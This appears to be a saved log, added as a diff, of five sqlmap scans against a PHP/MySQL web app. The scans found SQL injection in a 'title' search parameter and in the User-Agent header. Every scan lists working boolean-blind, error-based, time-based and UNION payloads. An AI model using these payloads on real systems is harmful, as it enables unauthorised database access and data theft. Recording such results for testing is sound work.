@@ -1,0 +1,78 @@
+sqlmap identified the following injection point(s) with a total of 143 HTTP(s) requests:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: title=123' OR NOT 7595=7595#&action=search
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: title=123' AND EXTRACTVALUE(4465,CONCAT(0x5c,0x716b716271,(SELECT (ELT(4465=4465,1))),0x717a707a71))-- Lnyc&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=123' AND (SELECT 7840 FROM (SELECT(SLEEP(5)))fLHN)-- KGpj&action=search
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 7 columns
+    Payload: title=123' UNION ALL SELECT NULL,NULL,CONCAT(0x716b716271,0x696c716669595542724c6e4465686f594f4a6f7776486f705568694d54584b495347637658496466,0x717a707a71),NULL,NULL,NULL,NULL#&action=search
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.1
+sqlmap identified the following injection point(s) with a total of 125 HTTP(s) requests:
+---
+Parameter: title (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: title=it' OR NOT 8350=8350#&action=search
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: title=it' AND EXTRACTVALUE(7615,CONCAT(0x5c,0x7162787a71,(SELECT (ELT(7615=7615,1))),0x7178767171))-- voxn&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=it' AND (SELECT 5391 FROM (SELECT(SLEEP(5)))ZkfL)-- aLzl&action=search
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 7 columns
+    Payload: title=it' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162787a71,0x69595a706e736966706c7a496358686e6442446d7170526c7a4b484d4471547a665550434f4e635a,0x7178767171),NULL#&action=search
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.5.9, Apache 2.4.7
+back-end DBMS: MySQL >= 5.1
+sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: title=123' AND 8261=(SELECT (CASE WHEN (8261=8261) THEN 8261 ELSE (SELECT 5709 UNION SELECT 8585) END))-- rocJ&action=search
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.0
+sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
+---
+Parameter: title (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=123' AND (SELECT 6151 FROM (SELECT(SLEEP(5)))yoMh) AND 'FnwR'='FnwR&action=search
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.5.9, Apache 2.4.7
+back-end DBMS: MySQL >= 5.0.12
+sqlmap identified the following injection point(s) with a total of 31 HTTP(s) requests:
+---
+Parameter: User-Agent #1* ((custom) HEADER)
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: test' AND EXTRACTVALUE(6327,CONCAT(0x5c,0x71716b7171,(SELECT (ELT(6327=6327,1))),0x7162627a71)) AND 'DTrP'='DTrP
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test' AND (SELECT 6100 FROM (SELECT(SLEEP(5)))XyeF) AND 'reBP'='reBP
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.5.9, Apache 2.4.7
+back-end DBMS: MySQL >= 5.1
